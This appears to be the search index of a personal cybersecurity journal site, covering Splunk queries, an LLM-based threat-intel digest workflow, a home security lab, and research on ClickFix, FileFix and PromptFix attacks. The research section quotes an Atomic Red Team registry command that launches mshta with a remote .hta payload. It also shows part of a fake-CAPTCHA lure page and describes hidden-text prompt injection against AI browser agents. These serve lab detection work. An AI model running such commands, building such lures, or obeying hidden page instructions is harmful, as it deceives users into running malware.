{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#welcome-my-cyber-journal","title":"Welcome my cyber journal!","text":""},{"location":"cheatsheets/","title":"Cheatsheets","text":""},{"location":"cheatsheets/#cheatsheets","title":"Cheatsheets","text":"<p>Personal collection of cheatsheets with items that come up on a recurring basis. </p>"},{"location":"cheatsheets/splunk/","title":"Splunk","text":""},{"location":"cheatsheets/splunk/#splunk-cheatsheet","title":"Splunk Cheatsheet","text":"<p>This page is a personal collection of useful Splunk queries and tips for analyzing data.</p>"},{"location":"cheatsheets/splunk/#search-field-performance","title":"Search &amp; field performance","text":"<p>In Splunk you can search for a term in the raw data or related to a specific field. While searching for a specific field (when possible) intuitively feels faster, it is not necessarily the case.     </p> <ul> <li>Raw term search (<code>\"search_value\"</code>): Matches token anywhere in <code>_raw</code> via inverted index. Fast. May match unintended fields or text.</li> <li>Field search (<code>field=\"search_value\"</code>): Matches only parsed field values. Requires search-time extraction unless field is indexed. To check if field is indexed:<ol> <li><code>| tstats count where index=&lt;index&gt; by &lt;field&gt;</code> \u2014 if results, field is indexed.</li> <li>Field appears immediately in search app\u2019s selected fields without extractions.</li> </ol> </li> <li>Performance: Non-indexed fields are slower due to extraction overhead. Indexed fields use <code>tsidx</code> and match raw term speed or slightly faster.</li> <li>Use field search when: Precision is needed, avoid false positives, or downstream commands depend on that field.</li> <li>Use raw term search when: Maximum speed and broad matching are acceptable.</li> </ul> <p>Summarized by AI (GPT-5)</p>"},{"location":"cheatsheets/splunk/#querying-datamodels","title":"Querying datamodels","text":"<p>Datamodels can accelarate search queries in Splunk. They can also combine multiple indices. Available datamodels can be found under Settings -&gt; Data -&gt; Data Models. </p> <p>1. <code>tstats</code> Command</p> <ul> <li>Purpose: Optimized for querying accelerated data models. Directly accesses pre-computed summaries.</li> <li>Syntax: <pre><code>| tstats &lt;aggregation&gt; from datamodel=&lt;DataModelName&gt;.&lt;DataSetName&gt; where &lt;DataSetName&gt;.&lt;FieldName&gt;=&lt;Value&gt; by &lt;DataSetName&gt;.&lt;FieldName&gt;\n</code></pre></li> <li>Example: <pre><code>| tstats summariesonly=true count from datamodel=Network_Traffic.All_Traffic \nwhere All_Traffic.dest_port=443 \nby All_Traffic.src_ip, All_Traffic.dest_ip\n</code></pre></li> <li>Characteristics:<ul> <li>Performance: Superior for aggregations on large, accelerated data.</li> <li>Limitations: Restricted to fields defined in data model acceleration; limited pre-aggregation transformations.</li> <li>Filtering: Uses <code>where</code> clause.</li> </ul> </li> </ul> <p>2. <code>| datamodel</code> Pipe Command</p> <ul> <li>Purpose: General command for retrieving events from any data model (accelerated or unaccelerated). Processes raw events.</li> <li> <p>Syntax: </p><pre><code>| datamodel &lt;DataModelName&gt; &lt;DataSetName&gt; | search &lt;FieldName&gt;=&lt;Value&gt; | &lt;other commands&gt;\n</code></pre><p></p> </li> <li> <p>Example: </p><pre><code>| datamodel Web_Traffic HTTP_Requests\n| search status=404 AND clientip!=\"10.0.0.0/8\"\n| eval request_size_kb = bytes / 1024\n| stats count as NotFoundCount, sum(request_size_kb) as TotalKBDelivered by url\n| sort - NotFoundCount\n| head 10\n</code></pre><p></p> </li> <li>Characteristics:<ul> <li>Flexibility: Allows complex initial filtering, <code>eval</code>, <code>rex</code>, and other transformations before aggregation.</li> <li>Performance: Can be slower than <code>tstats</code> for large, accelerated datasets due to raw event processing.</li> <li>Filtering: Uses standard <code>search</code> command.</li> </ul> </li> </ul> <p>Usage:</p> <ul> <li>Use <code>tstats</code>: For rapid aggregations on large, accelerated data models with straightforward filtering.</li> <li>Use <code>| datamodel</code>: For flexible event retrieval, pre-aggregation transformations, or unaccelerated data models.</li> </ul> <p>Summarized by AI (Gemini 2.5 Flash)</p>"},{"location":"projects/","title":"Overview","text":""},{"location":"projects/#overview","title":"Overview","text":""},{"location":"projects/genai/intel_digest_workflow/","title":"Daily Intelligence Digest Automation (n8n)","text":""},{"location":"projects/genai/intel_digest_workflow/#automation-workflow-create-daily-digest-identify-viral-topics-with-ai","title":"Automation Workflow: Create Daily Digest &amp; Identify Viral Topics with AI","text":"<p>This page showcases an automation workflow built for the tool n8n. This n8n workflow template simplifies the process of digesting cybersecurity reports by summarizing, deduplicating, organizing, and identifying viral topics of interest into daily emails.</p> <p>Info</p> <p>The workflow was submitted to n8n for review and is available as template. A JSON copy can also be downloaded from the repository under the 'projects' folder. This folder will contain the newest versions of the template.</p> <p></p> <p>The template was published on the n8n website and can be found here. </p>"},{"location":"projects/genai/intel_digest_workflow/#workflow-ai-threat-intelligence-compose-daily-digest-viral-topics-reports","title":"Workflow - AI Threat Intelligence: Compose Daily Digest &amp; Viral Topics Reports","text":"<p>Process cybersecurity reports into an AI-generated daily threat intelligence digest and viral topic report.</p> <p></p> <p>A n8n automation workflow for composing daily threat intelligence digest &amp; viral topics reports with AI.</p> <p>This n8n workflow simplifies the process of digesting cybersecurity reports by summarizing, deduplicating, organizing, and identifying viral topics of interest into daily emails. </p> <p>It will generate two types of emails: - A daily digest with summaries of deduplicated cybersecurity reports organized into various topics. - A daily viral topic report with summaries of recurring topics that have been identified over the last seven days. </p> <p>This workflow template supports threat intelligence analysts digest the high number of cybersecurity reports they must analyse daily by decreasing the noise and tracking topics of importance with additional care, while providing customizability with regards to sources and output format.</p>"},{"location":"projects/genai/intel_digest_workflow/#how-it-works","title":"How it works","text":"<p>The workflow follows the threat intelligence lifecycle as labelled by the coloured notes. - Every morning, collect news articles from a set of RSS feeds. - Merge the feeds output and prepare them for LLM consumption. - Task an LLM with writing an intelligence briefing that summarizes, deduplicates, and organizes the topics. - Generate and send an email with the daily digest. - Collect the daily digests of the last seven days and prepare them for LLM consumption. - Task an LLM with writing a report that covers 'viral' topics that have appeared prominently in the news.  - Store this report and send out over email.</p>"},{"location":"projects/genai/intel_digest_workflow/#how-to-use-customization","title":"How to use &amp; customization","text":"<ul> <li>The workflow will trigger daily at 7am. </li> <li>The workflow can be reused for other types of news as well. The RSS feeds can be swapped out and the AI prompts can easily be altered. </li> <li>The parameters used for the viral topic identification process can easily be changed (number of previous days considered, requirements for a topic to be 'viral').</li> </ul>"},{"location":"projects/genai/intel_digest_workflow/#requirements","title":"Requirements","text":"<ul> <li>The workflow leverages Gemini (free tier) for email content generation and Baserow for storing generated reports. The viral topic identification relies on the Gemini Pro model because of a higher data quantity and more complex task.</li> <li>An SMTP email account must be provided to send the emails with. This can be through Gmail. </li> </ul>"},{"location":"projects/genai/intel_digest_workflow/#prompts","title":"Prompts","text":"<p>The workflow uses two prompts; one for the 'basic' daily digest emails and one for the viral topics report.</p> <p>Prompt 1: daily digest</p> <p>You are an intelligence analyst. Summarize the following threat intelligence articles into a concise, high-signal daily briefing. Do not make things up. Drop items that are not relevant enough. Follow these rules:  </p> <ol> <li>Group information by topic. Use the following sections as guidelines:<ul> <li>Nation state actor activity</li> <li>Financially motivated actor activity</li> <li>Compromises and data breach activity (list victims only)</li> <li>Vulnerabilities activity (list with CVEs or affected products, only high priorities)</li> <li>Other miscellaneous activity that is sensible to share. Topics not related to cybersecurity can be disregarded. Ignore ads. Keep it short.</li> </ul> </li> <li>Deduplicate reports. If multiple sources report on the same event, merge them. Prefer brevity over repetition.</li> <li>Prioritize topics mentioned multiple times. Omit low-signal, one-off articles unless highly critical. Keep lines concise, prioritize readability of the end product over including all content. Topics should typically fit on a single line, having 20 words maximum.</li> <li>Link all sources found for an item. Deduplicated items should have more than one source.  </li> <li>Remove all ads, promotional language, or off-topic content.</li> <li>Use clear, non-speculative language. Avoid filler. </li> <li>Put it in well-unified JSON format.</li> </ol> <p>Prompt 2: viral topics</p> <p>You are an intelligence analyst reviewing cyber threat intelligence reports from the past x days, formatted in a defined JSON schema. Your task is to identify 'viral' news items that describe the same topic and appear across multiple days. When such overlapping topics are found:</p> <ul> <li>Merge them into a single entry.</li> <li>Ensure the merged entry is mentioned on multiple across the grouped items.</li> <li>Extract and synthesize a concise title and summary for the merged topic.</li> <li>Aggregate all associated references under the merged entry.</li> <li>Sort the merged topics based on newest source, descending.</li> </ul> <p>You may merge items across different categories (e.g., \u201cNation state actors\u201d, \u201cVulnerabilities\u201d) if they clearly concern the same underlying event or threat. Do not include or report on any item that does not meet the above threshold. The objective is to surface recurring, high-signal topics for a daily digest, consolidating redundant reports into unified narratives. It is more important to have three well-processed viral topics, than many bad ones.</p>"},{"location":"projects/genai/intel_digest_workflow/#examples","title":"Examples","text":"<p>See an example both types of emails below.</p> <p></p> <p>Example of a daily digest email.</p> <p></p> <p>Example of a daily viral topic digest email.</p>"},{"location":"projects/genai/intel_rag/","title":"Threat Actor RAG and Assessment","text":""},{"location":"projects/genai/intel_rag/#generative-ai-threat-intelligence-research-into-rags-and-automated-threat-actor-assessment","title":"Generative AI Threat Intelligence Research into RAGs and Automated Threat Actor Assessment","text":"<p>This project (see repository) explores proof-of-concepts to integrate generative AI with threat intelligence. It is heavily inspired by the excellent research of Roberto Rodriguez (@Cyb3rWard0g). It follows a similar structure with small alterations. It contains various Jupyter Notebooks that explore the different topics. Every notebook is documented and has various improvement ideas. It explores the following areas:</p> <ul> <li>Threat Actor RAG: Building a retrieval-augmented generation (RAG) system using unstructured sources such as the ETDA Cyber Threat Actor Encyclopedia. </li> <li>Report Summarizer: Normalizing reports on threat actors by generating concise summaries for further usage by GenAI.</li> <li>Threat Actor Assessment: Automating evaluations of threat actors\u2019 relevance and risk to organizations using generative models and the threat box framework, aiming for consistency and reduced manual effort.</li> </ul>"},{"location":"projects/genai/intel_rag/#overview","title":"Overview","text":"<p>This project contains four Jupyter Notebooks:</p> <ul> <li>threat_actor_knowledge_builder.ipynb: this notebook demonstrates how to build a threat actor source knowledge vector database based on the ETDA threat actor database and its linked reports. The output can be found in the GitHub repository or on Huggingface to skip this step.</li> <li>threat_actor_report_summarizer.ipynb: this notebook summarizes all threat actor reports that were scraped and combines them into one file per threat actor. The output can be found in the GitHub repository.</li> <li>threat_actor_QA.ipynb: this notebook demonstrates how to query a vector database in QA fashion using Langchain and OpenAI.</li> <li>threat_actor_assessment.ipynb: this notebook experiments with leveraging the threat actor report summaries to assess their threat according to a specific victim profile using the threat box model.</li> </ul> <p>This diagram describes the relationships between the previously mentioned components:</p> <p></p> <p>Overview of the project.</p>"},{"location":"projects/genai/intel_rag/#threat-actor-rag","title":"Threat Actor RAG","text":"<p>Retrieval Augmented Generation (RAG) is a method to retrieve context relevant for a chatbot prompt from a vector database. This way you can build a knowledge base and not be dependant on the LLMs context coverage and timeliness. You also have influence on what information the chatbot should work with and can prevent hallucinations. For more information see this great summary.</p> <p>@Cyb3rWard0g already experimented with using MITRE's threat actor database as knowledge for a RAG. This database contains very structured and consistent documents. I was curious to see how other, less controlled threat actor information sources would perform. I decided to do a simple scrape of the ETDA Threat Actor Encyclopedia. This database contains over 450 threat actors and provides various hyperlinks to reports about operations and information about these threat actors. See \"threat-actor-knowledge-builder.ipynb\" and \"threat-actor-QA.ipynb\" for the experiment.</p>"},{"location":"projects/genai/intel_rag/#report-summarizer","title":"Report Summarizer","text":"<p>The scraped reports vary in quality, length, and consistency. By summarizing them through an LLM we can iron out some of these issues. The summaries can also provide additional input for multi vector retrievers. This notebook describes how to loop over the reports and create summaries for reports where we can. It leverages OpenAI's API and deals with token limits.</p>"},{"location":"projects/genai/intel_rag/#threat-actor-assessment","title":"Threat Actor Assessment","text":"<p>As an organization you want to prioritize your resources through threat intelligence. By assessing threat actors for their threat level to your organization you can look at their TTPs to learn and prepare for. However, threat actor assessment can take a lot of effort through manual work, especially when kept up to date. It is also difficult to be consistent on the analysis through time and different analysts. Generative AI could support this process by assessing reports through some model. By leveraging the threat box model this notebook experiments with assessing threat actors through LLMs.</p>"},{"location":"projects/security_lab/","title":"Overview","text":""},{"location":"projects/security_lab/#overview","title":"Overview","text":""},{"location":"projects/security_lab/#ideas","title":"ideas","text":"<p>Linux persistence blog by elastic Amsi bypass Open source c2 framework</p>"},{"location":"projects/security_lab/architecture/","title":"Lab Architecture","text":""},{"location":"projects/security_lab/architecture/#lab-architecture","title":"Lab Architecture","text":"<p>This page describes the virtual machines that are part of the lab environment and how they are interconnected. The VMs are hosted on a desktop PC through Hyper-V. All VMs are forced to use a static IP; DHCP is turned off at the router level.</p> <p></p> <p>Security lab network architecture.</p>"},{"location":"projects/security_lab/architecture/#hypervisor-hyper-v","title":"Hypervisor: Hyper-V","text":"<p>TBD</p>"},{"location":"projects/security_lab/architecture/#routing-opnsense","title":"Routing: OPNsense","text":"<p>OPNsense is an open source, feature rich firewall and routing platform, offering cutting-edge network protection.</p> <p>OPNsense is used as router VM as it is free to use, has a wide range of features, and is open-source. The installation uses <code>OPNsense-25.1</code>. The <code>.img</code> was converted to <code>.vhdx</code> to work with Hyper-v using the following command:</p> <pre><code>qemu-img convert -f raw -O vhdx &lt;INPUT_IMAGE.img&gt; &lt;OUTPUT_IMAGE.vhdx&gt;\n</code></pre> <p>The VM is allocated two network adapters in Hyper-v to accommodate both a local network for the lab and internet access for the VMs (WAN &amp; LAN). These are created under `Virtual Switch Manager' in the Hyper-V settings for the host system:</p> <ul> <li>LAB - WAN Switch: connection type to external network to provide internet access.</li> <li>LAB - LAN Switch: connection type to private network to create network between VMs. </li> </ul> <p>DHCP was turned off to force clients to have a static IP. </p>"},{"location":"projects/security_lab/architecture/#security-infrastructure-security-onion","title":"Security infrastructure: Security Onion","text":"<p>Security Onion was installed in standalone configuration. It connects to the OPNsense router through both its management interface (<code>192.168.1.2</code>) and port mirroring interface. The virtual LAN switch is assigned to the OPNsense VM as 'Source' and to the Security Onion VM as 'Destination' under Advanced Features in Hyper-V for port mirroring. This ensures that all network traffic that is flowing over the Lab LAN network is shared to Security Onion for further analysis. </p>"},{"location":"projects/security_lab/architecture/#endpoint-windows-host","title":"Endpoint: Windows Host","text":"<p>A Windows VM is used as an endpoint to simulate attacks and generate logs on. It is a Windows evaluation VM (WinDev2407). It was given static IP <code>192.168.1.102</code>. Elastic Agent was installed to forward Windows logs and trigger on Elastic alerts (replacing MDE) through the Elastic Fleet manager in Security Onion. Sysmon was installed using a highly expressive configuration to gather additional logs for investigation.</p> <p>Replace MDE with Elastic Defend</p> <p>You can replace Microsoft Defender for Endpoint with Elastic Defend as antivirus solution after deploying the agent by doing the following in Kibana:</p> <p><code>Elastic Kibana -&gt; Security (sidebar) -&gt; Manage -&gt; Policies -&gt; choose policy -&gt; scroll to bottom and select 'Enabled' under 'Register as antivirus'</code></p> <p></p> <p>The Windows security settings should display this after the change.</p>"},{"location":"projects/security_lab/architecture/#endpoint-ubuntu","title":"Endpoint: Ubuntu","text":"<p>TBD</p>"},{"location":"projects/security_lab/architecture/#endpoint-kali","title":"Endpoint: Kali","text":"<p>TBD</p>"},{"location":"projects/security_lab/sec_onion/","title":"Security Onion Overview","text":""},{"location":"projects/security_lab/sec_onion/#security-onion","title":"Security Onion","text":""},{"location":"projects/security_lab/sec_onion/#introduction","title":"Introduction","text":"<p>Security Onion is a free and open platform built by defenders for defenders. It includes network visibility, host visibility, intrusion detection honeypots, log management, and case management.</p> <p>For network visibility, we offer signature based detection via Suricata, rich protocol metadata and file extraction using either Zeek or Suricata, full packet capture using either Stenographer or Suricata, and file analysis. For host visibility, we offer the Elastic Agent which provides data collection, live queries via osquery, and centralized management using Elastic Fleet. Intrusion detection honeypots based on OpenCanary can be added to your deployment for even more enterprise visibility. All of these logs flow into Elasticsearch and we\u2019ve built our own user interfaces for alerts, dashboards, threat hunting, case management, and grid management.</p>"},{"location":"projects/security_lab/sec_onion/#visibility","title":"Visibility","text":"<p>This section describes the various visibility sources Security Onion integrates with. It will cover both host and network visibility.</p> <p>Security Onion integrates the ELK stack (Elasticsearch, Logstash, Kibana) as its core log management and analysis layer. Logstash ingests and normalizes logs and network events from sensors, parsers, and other monitoring components within Security Onion. It applies filters and enrichments to make disparate log formats uniform. Elasticsearch stores the processed data as indexed documents, enabling rapid searching and correlation across large volumes of network, host, and security logs. Kibana provides the visualization and query interface, giving analysts dashboards for intrusion detection alerts, full packet capture metadata, endpoint logs, and system telemetry. Together, this stack supports Security Onion\u2019s role as a SIEM: collection, normalization, storage, search, correlation, and visualization of security events.</p> <p>Elastic also provides an agent that is deployed on endpoints to forward logs and serve as EDR solution to generate alerts. It replaces some of the functionality that Filebeat previously offered and can forward Sysmon logs. </p>"},{"location":"projects/security_lab/sec_onion/#host-visibility","title":"Host visibility","text":"<p>The endpoints in the network are used for experimentation into detection use cases. Therefore, they should forward as many logs as possible to Security Onion for further analysis into host visibility. This is achieved through deploying Elastic Agents, which function both as a log forwarder and alerting engine. This is managed through the Elastic Fleet.</p>"},{"location":"projects/security_lab/sec_onion/#elastic-agent","title":"Elastic Agent","text":"<p>With Elastic Agent you can collect all forms of data from anywhere with a single unified agent per host. One thing to install, configure, and scale. The Elastic Fleet is deploying an Elastic Agent policy named <code>endpoints-initial</code> to the endpoints. Agent policies dictate what data each agent will ingest and forward to Elasticsearch. This could be through the use of an HTTP, log file, or TCP-based input. The selected policy includes the following integrations:</p> <p></p> <p>Integrations included in the Elastic Agent policy <code>endpoints-initial</code> for endpoints.</p> <p>Info</p> <p>These integrations include the following data:</p> <ul> <li>elastic-defend-endpoints: this is Elastic's EDR-like integration with an alerting engine and both free and paid features. However, it is not setup to replace Windows Defender as EDR as we want to ingest as many logs and alerts as possible and therefore not block any activity on the endpoints. It captures events on Windows (API, DLL and Driver Load, DNS, File, Network, Process, Registry, Security), MacOS (File, Process, Network), and Linux (File, Process, Network). </li> <li>osquery-endpoints: this allows analysts to query information on the system directly through live or scheduled queries. It does not provide logs on a continuous basis.</li> <li>system-endpoints: this collects logs from System instances and Windows Events (Application, Security, and System).</li> <li>windows-defender: this collects custom Windows Event (Operational) logs. This integration was added manually. </li> <li>windows-endpoints: this collects logs from the channels ForwardedEvents, Powershell, Microsoft-Windows-Powershell/Operational, and Microsoft-Windows-Sysmon/Operational.</li> </ul>"},{"location":"projects/security_lab/sec_onion/#sysmon","title":"Sysmon","text":"<p>System Monitor (Sysmon) is a Windows system service and device driver that, once installed on a system, remains resident across system reboots to monitor and log system activity to the Windows event log. It provides detailed information about process creations, network connections, and changes to file creation time. By collecting the events it generates using Windows Event Collection or SIEM agents and subsequently analyzing them, you can identify malicious or anomalous activity and understand how intruders and malware operate on your network.</p> <p>Sysmon is deployed on Windows hosts in the network following these instructions. It is using the highly verbose configuration made by Roberto Rodrigues (@Cyb3rWard0g) to ingest as many logs as possible.</p>"},{"location":"projects/security_lab/sec_onion/#network-visibility","title":"Network visibility","text":"<p>Security Onion offers network visibility on various levels, ranging from metadata to full packet capture. Additionally, it provides automated captures file analysis. </p>"},{"location":"projects/security_lab/sec_onion/#zeek","title":"Zeek","text":"<p>Zeek is a powerful network analysis framework that is much different from the typical IDS you may know. (Zeek is the new name for the long-established Bro system. Note that parts of the system retain the \u201cBro\u201d name, and it also often appears in the documentation and distributions.)</p> <p>Zeek captures a wide range of network metadata, including specific protocols such as DNS, HTTP, SSL. It can also extract files.</p>"},{"location":"projects/security_lab/sec_onion/#suricata","title":"Suricata","text":"<p>Suricata is a free and open source, mature, fast and robust network threat detection engine. Suricata inspects the network traffic using a powerful and extensive rules and signature language, and has powerful Lua scripting support for detection of complex threats.</p> <p>Suricata functions as a network intrusion detection system (NIDS).</p>"},{"location":"projects/security_lab/sec_onion/#strelka","title":"Strelka","text":"<p>Strelka is a real-time file scanning system used for threat hunting, threat detection, and incident response. Based on the design established by Lockheed Martin\u2019s Laika BOSS and similar projects (see: related projects), Strelka\u2019s purpose is to perform file extraction and metadata collection at huge scale.</p> <p>Strelka will automatically analyze files extracted by Zeek and Suricata. Alerts can be generated based on this analysis.</p>"},{"location":"projects/security_lab/sec_onion/#analysis","title":"Analysis","text":"<p>Security Onion provides tools for the analyst through its Security Onion Console (SOC). This consists of a combination of custom and existing tools for analysts to analyze what Security Onion has captured and detected. </p> <p></p> <p>Overview of the Security Onion Console (SOC).</p>"},{"location":"projects/security_lab/sec_onion/#kibana","title":"Kibana","text":"<p>Elastic Kibana acts as the Security Information and Event Management (SIEM) of the ELK stack. While Security Onion offers custom tools, the preferred tool for log analysis is Kibana because of its completeness. </p>"},{"location":"projects/security_lab/sec_onion/#analytics","title":"Analytics","text":"<p>Kibana Analytics contains the pages used for searching logs with KQL queries. Logs are part of indices and data streams. Both can be used in queries, but data streams are more convenient. An index is rotated automatically when reaching a certain size and therefore the same type of data can be spread over multiple indices. Wildcards in your query can take care of this but data streams fix this issue as they provide a single named resource that acts as a front door to multiple indices. Therefore, data streams are more convenient to use.</p>"},{"location":"projects/security_lab/sec_onion/#elastic-defend","title":"Elastic Defend","text":"<p>Elastic Defend provides organizations with prevention, detection, and response capabilities with deep visibility for EPP, EDR, SIEM, and Security Analytics use cases across Windows, macOS, and Linux operating systems running on both traditional endpoints and public cloud environments.</p> <p>Kibana contains a special integration for Elastic Defend. Here, security rules and their alerts can be managed. The out-of-the-box configuration of Elastic Defend only enables about 25 alerts. We enabled all 1260 to have full coverage. This can be done through `Kibana -&gt; Security -&gt; Rules -&gt; Detection rules (SIEM) -&gt; Select all x rules -&gt; Bulk actions -&gt; Enable. The queries for the rules will now run on a schedule. This does not severely impact performance.</p> <p>More information for all available open-source Elastic Security rules (GitHub) can be found and searched for on this page. </p> <p>KQL vs EQL</p> <p>Kibana offers multiple query languages that can be used for searching logs and building alerts.</p> <p>KQL is a filter query language. It matches documents based on field values, supports full-text search, and logical operators. It does not provide sequence or temporal correlation.</p> <p>EQL is an event correlation language. It is designed for ordered event sequences, temporal relationships, and patterns over time. It can express constructs like sequence, until, and time windows, which KQL cannot. EQL is less flexible for free-form search but more powerful for behavioral detection.</p> <p>KQL use cases</p> <ul> <li>Ad-hoc searching in Discover for field values and text  </li> <li>Dashboards and visualizations that need fast filtering  </li> <li>Alerts or rules based only on static conditions like <code>process.name: \"powershell.exe\"</code> and <code>process.args_count &gt; 2</code> </li> <li>Investigations requiring flexible wildcard and fuzzy matching across multiple fields  </li> </ul> <p>EQL use cases</p> <ul> <li>Detection of process chains such as <code>explorer.exe \u2192 powershell.exe \u2192 rundll32.exe</code> </li> <li>Sequenced file and network events, e.g. a file write followed within 30s by an outbound connection  </li> <li>Behavioral rules that require temporal correlation (process A starts, then within X seconds process B starts)  </li> <li>Threat hunting patterns like persistence followed by privilege escalation  </li> </ul>"},{"location":"projects/security_lab/research/anyfix/","title":"AnyFix Technique","text":""},{"location":"projects/security_lab/research/anyfix/#the-anyfix-technique-a-deep-dive-into-malicious-copy-and-paste-attacks","title":"The \"AnyFix\" Technique: A Deep Dive into Malicious Copy-and-Paste Attacks","text":"<p>This is a deep dive into the family of social engineering techniques we're calling \"AnyFix,\" which includes variants like ClickFix, FileFix, and PromptFix. These attacks have seen rapid adoption by threat actors due to their effectiveness in bypassing traditional security controls by tricking users into executing malicious code. This technique is categorized under MITRE ATT&amp;CK as T1204.004 - User Execution: Malicious Copy and Paste.</p>"},{"location":"projects/security_lab/research/anyfix/#threat-intelligence","title":"Threat Intelligence","text":"<p>The \"AnyFix\" family of social engineering techniques has shown a dramatic increase in adoption by a wide range of threat actors since 2023, from initial access brokers to nation-state groups. These methods exploit user trust in familiar interfaces to achieve code execution, often bypassing traditional defenses because the malicious activity is initiated by the user themselves.</p> <p>Campaigns delivering malware such as LummaStealer, DarkGate, NetSupport RAT, and various ransomware families have successfully utilized these techniques. Threat actors like the Russian state-backed group Star Blizzard (also known as ColdRiver) and the Interlock ransomware gang have been observed employing ClickFix variants in their operations. The attack often begins with a phishing email, malvertising, or SEO poisoning that directs the user to a malicious webpage.</p>"},{"location":"projects/security_lab/research/anyfix/#attack-variants","title":"Attack Variants","text":"<p>There are multiple variants known in the \"AnyFix\" family. More variants are likely to emerge in the future.</p> <p>ClickFix</p> <p>The original technique, ClickFix, typically involves a webpage displaying a fake CAPTCHA or an error message. The user is instructed to copy a piece of text and paste it into the Windows Run dialog (<code>Win+R</code>) or a terminal to \"fix\" the issue. This command is often a PowerShell one-liner that downloads and executes the next stage of the attack.</p> <p>FileFix</p> <p>A stealthier evolution, FileFix, instructs the user to paste the malicious command into the Windows File Explorer address bar instead of the Run dialog. This can feel more benign to the user, as they may believe they are simply navigating to a file path. This method can also bypass Mark-of-the-Web (MOTW) warnings that would typically appear for downloaded files.</p> <p>PromptFix</p> <p>A newer and more sophisticated variant, PromptFix, targets users of AI-powered browsers and agents. Attackers embed malicious instructions in invisible text on a webpage. While the human user sees a normal page, the AI agent processes the hidden text as a command, potentially leading to actions like drive-by downloads or interacting with phishing sites without the user's knowledge.</p>"},{"location":"projects/security_lab/research/anyfix/#references","title":"References","text":"<ul> <li>(Microsoft) Think before you Click(Fix): Analyzing the ClickFix social engineering technique </li> <li>(Proofpoint) Security Brief: ClickFix Social Engineering Technique Floods Threat Landscape</li> <li>(KQLQuery.com) Investigating ClickFix Incidents</li> <li>(mrd0x.com) FileFix - A ClickFix Alternative</li> <li>(BleepingComputer) From ClickFix to MetaStealer: Dissecting Evolving Threat Actor Techniques</li> <li>(Sekoia) Interlock ransomware evolving under the radar</li> <li>(Elastic) A Wretch Client: From ClickFix deception to information stealer deployment</li> </ul>"},{"location":"projects/security_lab/research/anyfix/#attack-simulation","title":"Attack Simulation","text":"<p>We simulate parts of the attack to generate logs for further analysis. There are various options available:</p>"},{"location":"projects/security_lab/research/anyfix/#atomic-red-team","title":"Atomic Red Team","text":"<p>The Atomic Red Team project develops small and highly portable detection tests. They have created a special test for Clickfix, where Powershell is used to insert a payload as value for the RunMRU registry key. This simulation focuses on the unique registry artifact of the ClickFix technique and does not replicate the full user interaction.</p> <p>Atomic Red Team test for ClickFix</p> <p>Atomic Red Team: T1204.002 Test #12 - ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell </p> <p>Simulates a ClickFix-style campaign by adding a malicious entry to the RunMRU registry key that launches mshta.exe with a remote payload:</p> <pre><code>Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\" -Name \"atomictest\" -Value '\"C:\\Windows\\System32\\mshta.exe\" http://localhost/hello6.hta'\n</code></pre>"},{"location":"projects/security_lab/research/anyfix/#simulated-clickfix-filefix-page","title":"Simulated ClickFix &amp; FileFix Page","text":"<p>For a more realistic simulation, a static webpage can be crafted and hosted within a lab environment for live interaction from a victim machine. We will host HTML pages using Python on a Kali host and browse to them from a Windows host. </p>"},{"location":"projects/security_lab/research/anyfix/#webpages","title":"Webpages","text":"<p>We use simple HTML with JavaScript to copy the payload to the user's clipboard when a button is clicked, simulating the core mechanism of these attacks.</p> ClickFixFileFix HTML code for simulated ClickFix page <p>Embedded code from the 'projects' folder in the GitHub repository. Contains example payload.</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;head&gt;\n  &lt;title&gt;Verify you are human&lt;/title&gt;\n  &lt;style&gt;\n    /* Base page styling */\n    body {\n      background-color: #f2f2f2;\n      font-family: 'Segoe UI', sans-serif;\n      margin: 0;\n      padding: 40px 0;\n      display: flex;\n      justify-content: center;\n      align-items: flex-start;\n      min-height: 100vh;\n    }\n\n    /* Main centered container */\n    .container {\n      background-color: #ffffff;\n      width: 560px;\n      border-radius: 6px;\n      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);\n      border: 1px solid #dcdcdc;\n      text-align: center;\n    }\n\n    /* Header section with title and timestamp */\n    .header {\n      padding: 40px 30px 10px;\n    }\n\n    .header h2 {\n      font-size: 20px;\n      color: #2f2f2f;\n      margin: 0;\n    }\n\n    .timestamp {\n      font-size: 13px;\n      color: #7a7a7a;\n      margin-top: 6px;\n    }\n\n    /* Instructions block */\n    .instructions {\n      text-align: left;\n      padding: 25px 40px 10px;\n      font-size: 15px;\n      color: #333333;\n      line-height: 1.6;\n    }\n\n    .instructions ol {\n      margin: 0;\n      padding-left: 20px;\n    }\n\n    /* Fake captcha button */\n    .captcha-btn {\n      display: inline-block;\n      background-color: #ffffff;\n      border: 2px solid #ccc;\n      border-radius: 4px;\n      padding: 10px 16px;\n      font-size: 14px;\n      cursor: pointer;\n      margin-bottom: 15px;\n      user-select: none;\n    }\n\n    /* Captcha checked state */\n    .captcha-btn.checked {\n      border-color: #107c10;\n      color: #107c10;\n      font-weight: bold;\n    }\n\n    /* Footer section with branding */\n    .footer {\n      font-size: 11.5px;\n      color: #6b6b6b;\n      background-color: #f7f7f7;\n      padding: 12px 24px;\n      border-top: 1px solid #dcdcdc;\n      display: flex;\n      justify-content: space-between;\n      align-items: center;\n    }\n\n    .footer img {\n      height: 16px;\n    }\n  &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n  &lt;div class=\"container\"&gt;\n    &lt;!-- Header text --&gt;\n    &lt;div class=\"header\"&gt;\n      &lt;h2&gt;Verify you are human&lt;/h2&gt;\n      &lt;div class=\"timestamp\"&gt;06/20/2025 10:22:45 AM&lt;/div&gt;\n    &lt;/div&gt;\n\n    &lt;!-- Fake captcha button --&gt;\n    &lt;button id=\"captcha\" class=\"captcha-btn\"&gt;Start verification&lt;/button&gt;\n\n    &lt;!-- Instructions with steps --&gt;\n    &lt;div class=\"instructions\"&gt;\n      &lt;p&gt;Please verify that you are a human to continue.&lt;/p&gt;\n\n      &lt;ol id=\"steps\"&gt;\n        &lt;li style=\"margin-bottom: 10px;\"&gt;Press &lt;strong&gt;Windows Key + R&lt;/strong&gt;&lt;/li&gt;\n        &lt;li style=\"margin-bottom: 10px;\"&gt;Press &lt;strong&gt;CTRL + V&lt;/strong&gt; and press &lt;strong&gt;Enter&lt;/strong&gt;&lt;/li&gt;\n      &lt;/ol&gt;\n\n    